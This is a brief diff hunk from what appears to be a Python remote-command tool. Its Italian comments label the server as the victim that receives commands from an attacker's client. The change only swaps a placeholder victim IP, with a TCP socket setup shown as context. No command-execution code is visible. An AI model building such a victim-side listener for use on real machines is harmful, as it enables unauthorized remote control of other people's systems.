@@ -11,7 +11,7 @@ import shlex
 
 ###### SERVER (VITTIMA) CHE RICEVE I COMANDI DAL CLIENT (ATTACCANTE) ######
 
-HOST = '192.168.1.xxx'  # IP della vittima
+HOST = '192.168.xxx.xxx'  # IP della vittima
 PORT = 8888  # Porta da usare
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
